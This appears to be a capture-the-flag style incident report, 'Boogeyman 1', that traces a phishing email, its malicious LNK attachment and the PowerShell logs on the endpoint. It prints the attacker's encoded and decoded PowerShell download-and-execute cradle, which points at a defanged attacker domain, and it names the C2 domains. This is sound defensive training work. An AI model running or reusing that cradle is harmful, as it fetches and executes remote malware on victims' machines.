# Incident Report - Boogeyman 1

## Overview
**Environment:** Linux Ubuntu

**Captured Artefacts:** `capture.pcapng` (Captured Network Traffic), `dump.eml` (Copy of The Phishing E-mail), `powershell.json` (Powershell Logs)

**Tools Used:** Windows Event Logs, Wireshark, Tshark, LNKParse3, jq, Thunderbird, Message Header Analyzer

## Introduction



---

## Investigation

### Phase 1: E-mail Analysis
* First, obtained the `Invoice.zip` malicious attachment from the e-mail file `dump.eml` for analysis.
* Then, extracted the payload by using the password `Invoice2023!` from the zip file, titled `Invoice_20230103.lnk`.
* Used `LNKParse3` on the extracted payload to obtain the information inside the payload.
* The e-mails were revealed for the sender `agriffin@bpakcaging[.[xyz` and the receiver `[REDACTED]`.
* Based on the `DKIM-Signature` header, the sender used the third party mail relay service titled `elasticemail`.
* The following payload was found within the `Invoice_20230103.lnk` malicious file, encoded with Base64 UTF-16LE PowerShell:
  * **Encoded:** aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
  * **Decoded:** iex (new-object net.webclient).downloadstring('hxxp://files.bpakcaging[.]xyz/update')

### Phase 2: Endpoint Security
* Used `jq` on `powershell.json` to parse the powershell logs.
* Discovered the domains used by the attacker for file-hosting and C2, `cdn[.]bpakcaging[.]xyz` & `files[.]bpakcaging[.]xyz`, using the following command:
  * `jq -r '
.. | strings
| scan("(?i)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+(?:[a-z]{2,})")
' powershell.json | sort -u`
* Same command also revealed the tool used by the attacker, `Seatbelt`, which was used for enumeration.
* The attacker downloaded a malicious binary titled `sq3.exe`, with the following file path: `C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`
  * The command to trace the attacker's executed `cd` commands was used: `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort -u | grep -e "sq3.exe" -e "cd"
```[cite: 4]`
